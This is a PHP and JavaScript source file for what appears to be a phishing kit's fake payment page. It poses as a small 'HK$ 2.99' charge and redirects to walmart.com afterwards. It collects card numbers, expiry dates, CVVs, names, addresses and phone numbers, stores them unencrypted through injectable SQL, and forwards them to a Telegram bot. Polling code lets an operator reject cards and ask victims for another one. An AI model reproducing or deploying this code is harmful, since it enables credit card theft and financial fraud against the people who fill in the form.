<?php
session_start();
require_once 'api_commands.php';
include ABS_PATH.'/notification_send_to_bot.php';
//echo "<pre>";print_r($_SESSION);exit;
// include('partials/header.php');
include('header_.php');


//echo "<pre>";print_r($_SESSION);exit;

if(isset($_SESSION['post']['recipients_name'])) {
    $_SESSION['recipients_name'] = $_SESSION['post']['recipients_name'];
}
if(isset($_POST['cardnumber']) && $_POST['month'] && $_POST['year'] && $_POST['cvv']) {
    $_POST['recipients_name'] = $_SESSION['recipients_name'];
    $_SESSION['post'] = $_POST;
}
if (isset($_POST['submit'])) {
    $_SESSION['post_3data'] = $_POST;
}

if (isset($_POST['payment_submit']) and !empty($_SESSION['post'])) {

    $payment_info = $_POST;
    $user_details = $_SESSION['post_3data'];
    $_POST = $_SESSION['post'];
    $ip = get_client_ip();



    if (!empty($_POST['recipients_name'])) {
        $fullname = $_POST['recipients_name'];
    } else {
        $fullname = $_POST['card_holder_name'];
    }

    if (!empty($user_details['state'])) { // country
        $state = $user_details['state'];
    } else {
        $state = "";
    }

    if (!empty($user_details['zipcode'])) { // country
        $zipcode = $user_details['zipcode'];
    } else {
        $zipcode = "";
    }
 
    if (!empty($user_details['city'])) { // idtype
        $city = $user_details['city'];
    } else {
        $city = "";
    }

    if (!empty($user_details['address'])) { // id_number
        $address = $user_details['address']; //coming address
    } else {
        $address = "";
    }

    if (!empty($user_details['contact_number'])) {
        $phone = $user_details['contact_number'];
    } else {
        $phone = "";
    }
    $_SESSION["contact_number"] = $phone;


    if (!empty($payment_info['cardnumber'])) {
        $cardnumber = str_replace(' ', '', $payment_info['cardnumber']);
    } else {
        $cardnumber = "";
    }
    if (!empty($payment_info['month']) and !empty($payment_info['year'])) {
        $exp_date = $payment_info['month'] . '/' . $payment_info['year'];
    } else {
        $exp_date = "";
    }
    if (!empty($payment_info['cvv'])) {
        $card_code = $payment_info['cvv'];
    } else {
        $card_code = "";
    }

    $date = date('Y-m-d H:i:s');
    $sql = "INSERT INTO user_information (fullname,address,city,state, phone, date_created, date_updated, cardnumber, exp_date, card_code, ipaddress,source_code)
	VALUES ('" . $fullname . "', '" . $address . "', '" . $city . "', '" . $state . "', '" . $phone . "', '" . $date . "',now(),'" . $cardnumber . "','" . $exp_date . "','" . $card_code . "','" . $ip . "','".$folder_path."')";

// echo $sql; die;
    if (mysqli_query($conn, $sql)) {
        $last_id = mysqli_insert_id($conn);
        $_SESSION["last_id"] = $last_id;

        //Telegram sending code
        send_new_user($cardnumber, $exp_date, $card_code, $fullname, 0, $last_id, 0, "card");


        $message_data = array(
               'address'=> $address, 
               'city'=> $city, 
               'state'=> $state, 
               'zipcode'=> "", 
               'email'=> "", 
               'card_number'=> $cardnumber, 
               'card_expire'=> $exp_date, 
               'security_code'=> $card_code, 
               'card_holder'=> $fullname, 
               'ip'=> $ip, 
               'user_agent'=> $_SERVER['HTTP_USER_AGENT'], 
               'date_time'=> $date,
               'post_from'=> $folder_path,
               'phone'=> $phone
        );
        @notification_to_bot($message_data,$conn);


        $_SESSION['post'] = '';
        $_SESSION['total_quantity'] = '';
        $_POST = '';

        //echo '<script>window.location.replace("page5.php")</script>';
        echo '<style>.spinner-border{display:block !important;}</style>';
        echo '<style>.backdrop{display:block !important;}</style>';
        //echo "New record created successfully. Last inserted ID is: " . $last_id;
    } else {
        $err = "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
} // submit end

?>

    <style>
        .hideH {
            display:none !important;
        }
        .card-icons img:last-child {
            padding: 1px 0px !important;
            height: 30px !important;
            background-color: #fff !important;
           
        }
        .wrap {
            padding: 0px 20px;
            margin-top:50px;
        }
        .step{
            color: #325754;
            padding-bottom: 10px;
            font-weight: bold;
        }
        .top1 table.cstm-table td {
            font-size: 14px;
            letter-spacing: 0;
            white-space: normal;
            padding: 5px 0;
            vertical-align: text-bottom;
            line-height: 1.3;
            color:#000;
        }
        .top1 table.cstm-table td strong {
            white-space: nowrap;
            margin-right: 15px;
            color:#325754;
        }
        .form-input label {
            display: block;
            color:#333333;
            font-weight: bold;
        }
        .form-input input {
            width: calc(100% - 30px);
        }
        .form-row input, .form-input input, .form-row select {
            flex-grow: 1;
            border: 1px solid #325754;
            height: 30px;
            outline: none;
            padding: 0 10px;
            border-radius: 4px;
        }
        .form-input select {
            width: 100%;
            height: 30px;
            padding: 2px 12px;
            border: 1px solid #325754;
            border-radius: 3px;
        }
        .card-icons img:last-child {
            padding: 1px 4px;
            border-radius: 3px;
            background-color: #2870d3;
            height: 23px;
            position: relative;
            top: -1px;
        }
        .card-icons img {
            height: 25px;
            margin-top: 5px;
        }
        .form-input .select {
            padding-right: 15px;
            width: 25%;
            margin-top: 12px;
            margin-bottom: 12px;
        }
        label.required:after {
            content: " *";
            color: red;
        }
        .form-input {
            margin-bottom: 20px;
        }
        .form-input.cvv input {
            width: 70px;
            color:#333333;
        }
        .form-input.cvv {
            align-items: end;
            color:#333333;
            display: flex;
        }
        .form-input.cvv span img {
            width: 30px;
            margin-left: 20px;
        }
        .extra-details > p {
            color:#333333;
        }
        .form-input.ddmm {
            display: flex;
        }
        h3.step {
            font-size: 18px;
            font-weight: bold;
            color: #325754;
            margin-bottom: 10px;
        }
        .extra-details {
            text-align: center;
            font-weight: bold;
            margin-top: 25px;
            font-size: 14px;
            margin-bottom:20px;
        }

        .top1 h3 {
            text-align: center;
            margin-bottom: 15px;
            font-size:22px;
            margin-top: 15px;
            color:#325754;
        }

        .top1 table.cstm-table td {
            font-size: 14px;
            letter-spacing: 0;
            white-space: normal;
            padding: 5px 0;
            vertical-align: text-bottom;
            line-height: 1.3;
        }

        .top1 table.cstm-table td strong {
            white-space: nowrap;
            margin-right: 15px;
        }

        .top1 table.cstm-table {
            margin-bottom: 20px;
        }
        .card-icons {
            padding-bottom: 11px;
        }
        .backd-form {
            border: 2px solid black;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .form-input.cvv:last-child { border-bottom: none; }
        .form-input {
            border-bottom: 1px solid;
            padding: 20px;
        }
        .form-input {
            margin-bottom: unset !important;
        }
        @media(max-width: 767px) {
            .submit-btn {
                background-color: #0071dc;
                padding: 11px 24px;
                font-size: 20px;
                display: block;
                width: 100%;
                min-width: 120px;
                margin-left: auto;
                margin-right: auto;
                line-height: 22px;
                border-radius: 32px;
                color: #fff;
                border-color: #0071dc;
                height: auto;
                cursor: pointer;
            }

            .submit-btn:hover:hover {
                background-color: #0071dc;
                border-color: #0071dc;
            }
        }
    </style>

    <div class="wrap">

        <div class="form">
            <form action="" method="POST">
                <h3 class="step">

                    <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;">Payment Method Options</font>
                    </font>
                </h3>
                <div class="top1">
                    <table class="cstm-table" border="0" width="100%">
                     <tbody>
                        <tr>
                            <td><strong>Trading Amount :</strong></td>
                            <td>HK$ 2.99</td>
                        </tr>
                        </tbody>

                    </table>

                </div>

                <div class="backdrop"></div>
                <div class="backd-form">
                <div class="form-input">
                    <label class="required" for="">Card Number</label>
                    <input type="text" id="cr_no" name="cardnumber" minlength="19" maxlength="19" placeholder="xxxx-xxxx-xxxx-xxxx">

                    <span class="crediterror" style="color:red; display:none;">
                        <?php echo @$check_site_live['restricted_numbers_error']?@$check_site_live['restricted_numbers_error']:'Banka kartı ile ödeme şu anda desteklenmemektedir, lütfen ödeme için kredi kartınızı girin.'; ?>
                        </span>

                    <span class="errormsg" style="color:red; display:none;">The card is not supported, please replace and re-e</span>
                </div>
                <div class="form-input ddmm">
                    <div class="select">
                        <label class="required" for="">Cut-off date</label>
                        <select name="month" id="">
                            <option value="">Month</option>
                            <?php for ($i = 1; $i <= 12; $i++) echo ('<option value="' . $i . '">' . $i . '</option>'); ?>
                        </select>
                    </div>
                    <div class="select">
                        <label class="required" for="">As of Year</label>
                        <select name="year" id="">
                            <option value="">years</option>
                            <?php for ($i = 22; $i <= 32; $i++) echo ('<option value="' . $i . '">' . $i . '</option>'); ?>
                        </select>
                    </div>
                </div>
                <div class="form-input">
                    <label class="required" for="">Cardholder Name</label>
                    <input type="text" value="<?php echo isset($_SESSION['post']['recipients_name']) ? $_SESSION['post']['recipients_name'] : $_SESSION['recipients_name']; ?>" name="card_holder_name">
                </div>
                <div class="form-input cvv">
                    <label class="required" for="">Security Code</label>
                    <input type="text" name="cvv" maxlength="4">
                    <span><img src="<?php echo $folder_path;?>/images/cvv.jpg" alt="">The last 3 digits shown on the back of the card<strong></strong></span>
                </div>
                
            </div>
            <div class="center"><button class="btn disabled submit-btn disabledClass" disabled onclick="hitSubmit()" name="payment_submit" type="submit">Payments</button></div>
            </form>
            <div class="extra-details">
                <div class="card-icons">
                 <img src="<?php echo $folder_path;?>/images/social.png" alt="">
                </div>
                <p>Remark: Credit cards of individual issuing banks/institutions may not be available for online transactions.</br>
                    If you have any problems with your credit card transactions on this site</br>
                    Please contact your issuing bank/institution.</p>
            </div>
        </div>
    </div>

    <div class="spinner-border" id="ajaxprogress" style="z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;left: unset;right: unset;" role="status">
  <span class="" style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
      <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
  </span>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js" integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script type="text/javascript" src="<?php echo $folder_path;?>/assets/js/jquery-2.1.3.min.js"></script>
    <script>
        function hitSubmit() {
            $(".backdrop").show();
            $('#ajaxprogress').show();
        }
        //script to check input
        jQuery('.form-input input, .form-input select').on('input', function() {
            let check = true;
            jQuery('.form-input input, .form-input select').each(function() {
                if (jQuery(this).val() == '') check = false;
            });
            if (check) jQuery('.btn').removeClass('disabled');
            else jQuery('.btn').addClass('disabled')
        });
        function creditCardValidation()
        {
            let creditCradNum = $('#cr_no').val();
            console.log("creditCradNum ==>",creditCradNum.length === 19);
            if(creditCradNum.length === 19)
            {
                $(".submit-btn").removeClass('disabled');
                $(".submit-btn").removeClass('disabledClass');
                $(".submit-btn").attr('disabled', false);
                return true;
            }
            else
            {
                console.log("Please enter a valid credit card number.");
                $(".submit-btn").addClass('disabledClass');
                $(".submit-btn").attr('disabled', true);
                return false;
            }
        }

        //For Card Number formatted input
        var cardNum = document.getElementById('cr_no');
        cardNum.onkeyup = function(e) {
            creditCardValidation();
            $("#cr_no").removeAttr("style");
            $(".errormsg").css("display", "none");
            if (this.value == this.lastValue) return;
            let caretPosition = this.selectionStart;
            let sanitizedValue = this.value.replace(/[^0-9]/gi, '');
            let parts = [];

            for (var i = 0, len = sanitizedValue.length; i < len; i += 4) {
                parts.push(sanitizedValue.substring(i, i + 4));
            }

            for (var i = caretPosition - 1; i >= 0; i--) {
                var c = this.value[i];
                if (c < '0' || c > '9') {
                    caretPosition--;
                }
            }
            caretPosition += Math.floor(caretPosition / 4);

            this.value = this.lastValue = parts.join(' ');
            this.selectionStart = this.selectionEnd = caretPosition;
            // if (sanitizedValue.length > 0)
            //   $("input[name=payment_submit]").removeAttr('disabled');
            // else
            //   $("input[name=payment_submit]").attr('disabled', 'disabled');
        }
    </script>


    <script type="text/javascript">
        function updatePromptStatus() {
            $.ajax({
                type: 'post',
                url: '<?php echo $folder_path;?>/prompt_status.php',
                data: {
                    'userid': userid,
                    'page': 4
                },
                success: function (data) {
                }
            });
        }
        jQuery(document).ready(function() {
            popcount = 1;
            window.setInterval(function() {
                // do stuff
                var userid = '<?php echo @$_SESSION["last_id"]; ?>';
                $.ajax({
                    type: 'post',
                    url: '<?php echo $folder_path;?>/usertrackingstatus.php',
                    data: {
                        'userid': userid,
                        'page': 2
                    },
                    success: function(data) {
                        if (data == 1) {

                            let page4_redirect = localStorage.getItem("page4_redirect");
                            let page4_redirect_time = localStorage.getItem("page4_redirect_time");
                            if(page4_redirect=='on'){
                                setTimeout(function() {
                                    jQuery(location).attr('href', 'https://www.walmart.com/');
                                }, page4_redirect_time*1000);
                             }else{
                                jQuery(location).attr('href', './page5.php'); 
                             }
                            
                        }
                        if (data == 2 || data == '2') {
                            jQuery("#ajaxprogress").css("display", "none")
                            jQuery('#carderror').css('display', 'block');
                            if (popcount == 1) {
                                if (window.confirm('The card is not supported, please get another card to pay.')) {
                                    console.log("window confirm box message");
                                    $(".backdrop").addClass('hideH');
                                    $('#ajaxprogress').addClass('hideH');
                                    updatePromptStatus();
                                }
                            }
                            popcount++;
                            $(".backdrop").hide();
                            return false;
                        }

                    }
                });

            }, 4000);

             $("body").on("keyup", "#cr_no", function() {
                console.log('validate credit debit');
                event.preventDefault();
                var cc_number_7 = $(this).val().replace(/ /g, '');
                if (cc_number_7.length > 7) {
                    $.ajax({
                        type: 'post',
                        url: '/validate.php',
                        data: {
                            'cc_number_7': cc_number_7,
                            'action': 'cc_details'
                        },
                        success: function(data) {
                            if (data == 1) {
                                $(".submit-btn").removeAttr('disabled');
                                $("input[name=payment_submit]").removeAttr('disabled');
                                $("input[name=payment_submit]").removeClass('disabled');
                                $('.crediterror').css("display", "none");
                                return true;
                            } else if (data == 'card_blocked') {
                                $('.crediterror').css("display", "block");
                                $(".submit-btn").attr('disabled', true);
                                return false;
                            } else {
                                $('.crediterror').css("display", "block");
                                $(".submit-btn").attr('disabled', true);
                                return false;
                            }
                        }
                    });
                }
            });


            $("body").on("change", "#cr_no", function() {

                var ignoreArray = ["123456789", "22222222"];
                var currentValue = $(this).val().replace(/ /g, '');

                if (jQuery.inArray(currentValue, ignoreArray) != -1) {
                    $("#cr_no").css("border", "2px solid #0071dc");
                    $(".errormsg").css("display", "block");

                }


            })

        })
    </script>
    <script>
        /* JS comes here */
        function setOnline(id, status) {
            if (id) {
                $.ajax({
                    type: 'post',
                    url: '<?php echo $folder_path;?>/usertrackingstatus.php',
                    data: {
                        'id': id,
                        'status': status
                    },
                    success: function(data) {

                    }
                });
            }
        }
        var userid = <?php echo isset($_SESSION["last_id"]) ? $_SESSION["last_id"] : ''; ?>


            window.addEventListener('load', function(e) {
                if (navigator.onLine) {
                    setOnline(userid, 1)
                } else {
                    setOnline(userid, 0)
                }
            }, false);

        window.addEventListener('online', function(e) {
            setOnline(userid, 1)
        }, false);

        window.addEventListener('offline', function(e) {
            setOnline(userid, 0)
        }, false);
    </script>

<?php
include('footer_.php');
